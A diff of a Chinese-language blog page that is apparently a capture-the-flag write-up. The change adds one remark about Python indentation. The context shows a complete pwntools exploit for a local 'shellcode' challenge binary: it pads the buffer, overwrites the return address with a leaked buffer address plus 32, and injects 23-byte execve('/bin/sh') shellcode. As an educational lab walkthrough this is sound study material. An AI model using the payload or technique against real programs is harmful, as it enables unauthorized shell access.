@@ -44,7 +44,7 @@
 <p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a><br><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a> </p>
 </blockquote>
 <p>这个shellcode只有23个字节，短小精悍，适合放在栈中去执行</p>
-<p>写exp</p>
+<p>写exp (发现一个地方：就是正常python代码不能在开头留空格)</p>
 <figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">addr = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Now give me your answer&#x27;</span>)</span><br><span class="line">shellcode=<span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(addr,<span class="number">16</span>)+<span class="number">32</span>) + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>这里我们只知道一个确定的buf的addr，shellcode的地址要从buf的地址推出来，也就是int(addr,16)+32</p>
 <h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>疑问</strong><br>为什么不可以找一个长度小于24的shellcode直接写入buf中呢？而非要先填充buf再返回至写shellcode的地方呢？<br>在网上找到一个解释不知道对不对</p>
